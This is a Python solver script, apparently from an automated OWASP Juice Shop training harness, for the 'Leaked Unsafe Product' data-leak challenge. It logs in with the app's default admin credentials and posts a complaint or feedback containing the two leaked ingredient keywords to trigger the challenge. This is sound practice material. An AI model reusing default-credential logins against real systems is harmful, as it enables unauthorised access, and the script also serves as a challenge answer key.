from core.base_solver import BaseSolver
from loguru import logger

class LeakedUnsafeProductSolver(BaseSolver):
    """
    Challenge: Leaked Unsafe Product (dlpPastebinDataLeakChallenge)
    Lỗ hổng: Data Leak via Pastebin
    
    Theo source code verify.ts dòng 433-440:
    - dangerousIngredients() lấy keywordsForPastebinDataLeakChallenge từ config
    - Rippertuer Special Juice có keywords: "hueteroneel" và "eurogium edule"
    - Challenge check: Comment/Complaint phải chứa CẢ HAI keywords này (Op.and)
    """
    @property
    def challenge_key(self) -> str:
        return "dlpPastebinDataLeakChallenge"  # Đúng key theo source code!

    def solve(self) -> bool:
        # Step 1: Login to send complaint
        login_res = self.client.post("/rest/user/login", json={
            "email": "admin@juice-sh.op", 
            "password": "admin123"
        })
        token = login_res.json().get("authentication", {}).get("token")
        if not token:
            logger.error("Failed to login")
            return False
        
        headers = {"Authorization": f"Bearer {token}"}
        
        # Step 2: Send complaint với ĐÚNG keywords từ config/default.yml
        # Keywords: "hueteroneel" và "eurogium edule" (từ Rippertuer Special Juice)
        # Phải chứa CẢ HAI keywords (Op.and trong verify.ts)
        complaint_payload = {
            "message": "I found dangerous ingredients: hueteroneel and eurogium edule in your products!"
        }
        res = self.client.post("/api/Complaints", json=complaint_payload, headers=headers)
        
        if res.status_code != 201:
            # Thử Feedback
            feedback_payload = {
                "comment": "Dangerous: hueteroneel eurogium edule",
                "rating": 3
            }
            res = self.client.post("/api/Feedbacks", json=feedback_payload)
        
        return res.status_code == 201
